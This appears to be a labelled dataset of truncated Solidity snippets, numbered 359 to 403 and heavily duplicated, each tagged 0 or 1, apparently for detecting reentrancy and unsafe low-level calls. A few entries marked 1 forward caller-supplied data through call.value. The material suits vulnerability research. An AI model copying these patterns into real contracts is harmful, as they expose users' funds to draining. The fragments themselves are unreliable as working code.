tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
360 14284.sol
function payCharity() payable public {
uint256 ethToPay = SafeMath.sub(totalEthCharityCollected, totalEthCharityRecieved);
require(ethToPay > 1);
totalEthCharityRecieved = SafeMath.add(totalEthCharityRecieved, ethToPay);
if(!giveEthCharityAddress.call.value(ethToPay).gas(400000)()) {
totalEthCharityRecieved = SafeMath.sub(totalEthCharityRecieved, ethToPay);
0
---------------------------------
361 14284.sol
function payCharity() payable public {
uint256 ethToPay = SafeMath.sub(totalEthCharityCollected, totalEthCharityRecieved);
require(ethToPay > 1);
totalEthCharityRecieved = SafeMath.add(totalEthCharityRecieved, ethToPay);
if(!giveEthCharityAddress.call.value(ethToPay).gas(400000)()) {
totalEthCharityRecieved = SafeMath.sub(totalEthCharityRecieved, ethToPay);
0
---------------------------------
362 14284.sol
function payCharity() payable public {
uint256 ethToPay = SafeMath.sub(totalEthCharityCollected, totalEthCharityRecieved);
require(ethToPay > 1);
totalEthCharityRecieved = SafeMath.add(totalEthCharityRecieved, ethToPay);
if(!giveEthCharityAddress.call.value(ethToPay).gas(400000)()) {
totalEthCharityRecieved = SafeMath.sub(totalEthCharityRecieved, ethToPay);
0
---------------------------------
363 14284.sol
function payCharity() payable public {
uint256 ethToPay = SafeMath.sub(totalEthCharityCollected, totalEthCharityRecieved);
require(ethToPay > 1);
totalEthCharityRecieved = SafeMath.add(totalEthCharityRecieved, ethToPay);
if(!giveEthCharityAddress.call.value(ethToPay).gas(400000)()) {
totalEthCharityRecieved = SafeMath.sub(totalEthCharityRecieved, ethToPay);
0
---------------------------------
364 14284.sol
function payCharity() payable public {
uint256 ethToPay = SafeMath.sub(totalEthCharityCollected, totalEthCharityRecieved);
require(ethToPay > 1);
totalEthCharityRecieved = SafeMath.add(totalEthCharityRecieved, ethToPay);
if(!giveEthCharityAddress.call.value(ethToPay).gas(400000)()) {
totalEthCharityRecieved = SafeMath.sub(totalEthCharityRecieved, ethToPay);
0
---------------------------------
365 14284.sol
function payCharity() payable public {
uint256 ethToPay = SafeMath.sub(totalEthCharityCollected, totalEthCharityRecieved);
require(ethToPay > 1);
totalEthCharityRecieved = SafeMath.add(totalEthCharityRecieved, ethToPay);
if(!giveEthCharityAddress.call.value(ethToPay).gas(400000)()) {
totalEthCharityRecieved = SafeMath.sub(totalEthCharityRecieved, ethToPay);
0
---------------------------------
366 2189.sol
function transferAndCall(address _to, uint256 _value, bytes _data) public payable whenNotPaused returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
contract GOeurekaSale is Claimable, gotTokenSaleConfig, Pausable, Salvageable {
using SafeMath for uint256;
GOeureka public token;
WhiteListedBasic public whiteListed;
uint256 public presaleEnd;
uint256 public saleEnd;
uint256 public minContribution;
address public multiSig;
uint256 public weiRaised;
uint256 public tokensRaised;
mapping(address => uint256) public contributions;
uint256 public numberOfContributors = 0;
uint public basicRate;
event TokenPurchase(address indexed beneficiary, uint256 value, uint256 amount);
event SaleClosed();
event HardcapReached();
event NewCapActivated(uint256 newCap);
constructor(GOeureka token_, WhiteListedBasic _whiteListed) public {
basicRate = 3000;
calculateRates();
presaleEnd = 1536508800;
saleEnd = 1543593600;
multiSig = MULTISIG_ETH;
token = token_;
whiteListed = _whiteListed;
bool allocated = false;
1
---------------------------------
367 2189.sol
function transferAndCall(address _to, uint256 _value, bytes _data) public payable whenNotPaused returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
contract GOeurekaSale is Claimable, gotTokenSaleConfig, Pausable, Salvageable {
using SafeMath for uint256;
GOeureka public token;
WhiteListedBasic public whiteListed;
uint256 public presaleEnd;
uint256 public saleEnd;
uint256 public minContribution;
address public multiSig;
uint256 public weiRaised;
uint256 public tokensRaised;
mapping(address => uint256) public contributions;
uint256 public numberOfContributors = 0;
uint public basicRate;
event TokenPurchase(address indexed beneficiary, uint256 value, uint256 amount);
event SaleClosed();
event HardcapReached();
event NewCapActivated(uint256 newCap);
constructor(GOeureka token_, WhiteListedBasic _whiteListed) public {
basicRate = 3000;
calculateRates();
presaleEnd = 1536508800;
saleEnd = 1543593600;
multiSig = MULTISIG_ETH;
token = token_;
whiteListed = _whiteListed;
bool allocated = false;
1
---------------------------------
368 29517.sol
function temporaryEscapeHatch(address to, uint256 value, bytes data) public {
require(msg.sender == admin);
require(to.call.value(value)(data));
0
---------------------------------
369 3054.sol
function player_withdrawPendingTransactions() public returns (bool){
uint withdrawAmount = playerPendingWithdrawals[msg.sender];
playerPendingWithdrawals[msg.sender] = 0;
if (msg.sender.call.value(withdrawAmount)()) {
return true;
} else {
playerPendingWithdrawals[msg.sender] = withdrawAmount;
return false;
0
---------------------------------
370 3054.sol
function player_withdrawPendingTransactions() public returns (bool){
uint withdrawAmount = playerPendingWithdrawals[msg.sender];
playerPendingWithdrawals[msg.sender] = 0;
if (msg.sender.call.value(withdrawAmount)()) {
return true;
} else {
playerPendingWithdrawals[msg.sender] = withdrawAmount;
return false;
0
---------------------------------
371 3054.sol
function player_withdrawPendingTransactions() public returns (bool){
uint withdrawAmount = playerPendingWithdrawals[msg.sender];
playerPendingWithdrawals[msg.sender] = 0;
if (msg.sender.call.value(withdrawAmount)()) {
return true;
} else {
playerPendingWithdrawals[msg.sender] = withdrawAmount;
return false;
0
---------------------------------
372 39664.sol
function migrateBlockjack() only(ADMIN_CONTRACT) {
stopBlockjack();
if (currentBankroll > initialBankroll) {
if (!ADMIN_CONTRACT.call.value(currentBankroll - initialBankroll)()) throw;
suicide(DX);
function shareProfits() onlyOwner {
if (profitsLockedUntil > now) throw;
if (currentBankroll <= initialBankroll) throw;
uint256 profit = currentBankroll - initialBankroll;
if (!ADMIN_CONTRACT.call.value(profit)()) throw;
currentBankroll -= profit;
bankrollLockedUntil = now + BANKROLL_LOCK_PERIOD;
profitsLockedUntil = bankrollLockedUntil + BANKROLL_LOCK_PERIOD;
0
---------------------------------
373 17573.sol
function transferFrom(address _from, address _to, uint256 _amount, bytes _data, string _custom_fallback) public  returns (bool success)    {
if (isContract(controller)) {
if (!TokenController(controller).onTransfer(_from, _to, _amount))
throw;
require(super.transferFrom(_from, _to, _amount));
if (isContract(_to)) {
ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);
receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), _from, _amount, _data);
ERC223Transfer(_from, _to, _amount, _data);
return true;
function transfer( address _to,  uint _amount, bytes _data,  string _custom_fallback)  public   returns (bool success)  {
return transferFrom(msg.sender, _to, _amount, _data, _custom_fallback);
0
---------------------------------
374 17573.sol
function transferFrom(address _from, address _to, uint256 _amount, bytes _data, string _custom_fallback) public  returns (bool success)    {
if (isContract(controller)) {
if (!TokenController(controller).onTransfer(_from, _to, _amount))
throw;
require(super.transferFrom(_from, _to, _amount));
if (isContract(_to)) {
ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);
receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), _from, _amount, _data);
ERC223Transfer(_from, _to, _amount, _data);
return true;
function transfer( address _to,  uint _amount, bytes _data,  string _custom_fallback)  public   returns (bool success)  {
return transferFrom(msg.sender, _to, _amount, _data, _custom_fallback);
0
---------------------------------
375 17573.sol
function transferFrom(address _from, address _to, uint256 _amount, bytes _data, string _custom_fallback) public  returns (bool success)    {
if (isContract(controller)) {
if (!TokenController(controller).onTransfer(_from, _to, _amount))
throw;
require(super.transferFrom(_from, _to, _amount));
if (isContract(_to)) {
ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);
receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), _from, _amount, _data);
ERC223Transfer(_from, _to, _amount, _data);
return true;
function transfer( address _to,  uint _amount, bytes _data,  string _custom_fallback)  public   returns (bool success)  {
return transferFrom(msg.sender, _to, _amount, _data, _custom_fallback);
0
---------------------------------
376 17573.sol
function transferFrom(address _from, address _to, uint256 _amount, bytes _data, string _custom_fallback) public  returns (bool success)    {
if (isContract(controller)) {
if (!TokenController(controller).onTransfer(_from, _to, _amount))
throw;
require(super.transferFrom(_from, _to, _amount));
if (isContract(_to)) {
ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);
receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), _from, _amount, _data);
ERC223Transfer(_from, _to, _amount, _data);
return true;
function transfer( address _to,  uint _amount, bytes _data,  string _custom_fallback)  public   returns (bool success)  {
return transferFrom(msg.sender, _to, _amount, _data, _custom_fallback);
0
---------------------------------
377 23803.sol
function () payable {
if (!founder.call.value(msg.value)()) revert();
0
---------------------------------
378 16884.sol
function mintETHRewards(address _contract, uint256 _amount) public onlyManager() {
require(_contract.call.value(_amount)());
0
---------------------------------
379 16884.sol
function mintETHRewards(address _contract, uint256 _amount) public onlyManager() {
require(_contract.call.value(_amount)());
0
---------------------------------
380 39127.sol
function executeProposal(uint256 _proposalID, bytes _transactionBytecode) onlyCongressMembers {
Proposal p = proposals[_proposalID];
if (p.state != ProposalState.Passed) throw;
p.state = ProposalState.Executed;
if (!p.beneficiary.call.value(p.etherAmount * 1 ether)(_transactionBytecode)) { throw; }
ProposalExecutedEvent(_proposalID);
0
---------------------------------
381 39127.sol
function executeProposal(uint256 _proposalID, bytes _transactionBytecode) onlyCongressMembers {
Proposal p = proposals[_proposalID];
if (p.state != ProposalState.Passed) throw;
p.state = ProposalState.Executed;
if (!p.beneficiary.call.value(p.etherAmount * 1 ether)(_transactionBytecode)) { throw; }
ProposalExecutedEvent(_proposalID);
0
---------------------------------
382 40341.sol
function carefulSendWithFixedGas(address _toAddress, uint _valueWei, uint _extraGasIncluded) internal returns (bool success) {
return _toAddress.call.value(_valueWei).gas(_extraGasIncluded)();
contract FundsHolderMixin is ReentryProtectorMixin, CarefulSenderMixin {
mapping (address => uint) funds;
event FundsWithdrawnEvent(address fromAddress, address toAddress, uint valueWei);
function withdrawFundsAdvancedRP(address _toAddress, uint _valueWei, uint _extraGasIncluded) internal {
if (msg.value != 0) { throw; }
address fromAddress = msg.sender;
if (_valueWei > funds[fromAddress]) { throw; }
funds[fromAddress] -= _valueWei;
bool sentOk = carefulSendWithFixedGas(_toAddress, _valueWei, _extraGasIncluded);
if (!sentOk) { throw; }
FundsWithdrawnEvent(fromAddress, _toAddress, _valueWei);
contract MoneyRounderMixin {
function compensateLatestMonarch(uint _compensationWei) internal {
address compensationAddress = latestMonarchInternal().compensationAddress;
latestMonarchInternal().compensationWei = _compensationWei;
bool sentOk = carefulSendWithFixedGas(compensationAddress, _compensationWei,suggestedExtraGasToIncludeWithSends);
if (sentOk) {
CompensationSentEvent(compensationAddress, _compensationWei);
} else {
funds[compensationAddress] += _compensationWei;
CompensationFailEvent(compensationAddress, _compensationWei);
0
---------------------------------
383 14458.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) public whenNotPaused notSelf(_to) returns (bool success){
require(_to != address(0));
if(isContract(_to)) {
if(accountBalances[msg.sender].addressBalance < _value){
revert();
if(safeAdd(accountBalances[_to].addressBalance, _value) < accountBalances[_to].addressBalance){
revert();
isNewRound();
subFromAddressBalancesInfo(msg.sender, _value);
addToAddressBalancesInfo(_to, _value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value, _data);
Transfer(msg.sender, _to, _value);
return true;
} else {
return transferToAddress(msg.sender, _to, _value, _data);
0
---------------------------------
384 9600.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
385 9600.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
386 9600.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
387 9600.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
388 9600.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
389 9600.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
390 39326.sol
function executeProposal( uint256 id, bytes transactionBytecode) onlyMembers {
Proposal p = proposals[id];
if (now < p.votingDeadline || p.executed || p.proposalHash != sha3(p.recipient, p.amount, transactionBytecode) || p.numberOfVotes < minimumQuorum)  throw;
if (p.currentResult > majorityMargin) {
p.executed = true;
if (!p.recipient.call.value(p.amount)(transactionBytecode))  throw;
p.proposalPassed = true;
} else {
p.proposalPassed = false;
ProposalTallied(id, p.numberOfVotes, p.proposalPassed);
0
---------------------------------
391 2387.sol
function transferAndCall(address to, uint256 value, bytes data) public payable liquid returns (bool) {
require(to != address(this) && data.length >= 68 && transfer(to, value));
assembly {
mstore(add(data, 36), value)
mstore(add(data, 68), caller)
require(to.call.value(msg.value)(data));
return true;
1
---------------------------------
392 39684.sol
function () payable {
if (msg.data.length > 0) {
createSeries(msg.data, 0, "", "", 0x0);
} else
if (latestSeriesForUser[msg.sender] != 0) {
if (latestSeriesForUser[msg.sender].call.value(msg.value)())
DepositMade(latestSeriesForUser[msg.sender], msg.value);
} else {
createSeries("", 0, "", "", 0x0);
address public seriesFactory;
address public owner;
0
---------------------------------
393 10604.sol
function executeTransaction(address to, uint256 value, bytes data) public onlyOwner returns (bool) {
return to.call.value(value)(data);
0
---------------------------------
394 10604.sol
function executeTransaction(address to, uint256 value, bytes data) public onlyOwner returns (bool) {
return to.call.value(value)(data);
0
---------------------------------
395 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
396 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
397 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
398 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
399 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
400 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
401 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
402 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
403 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
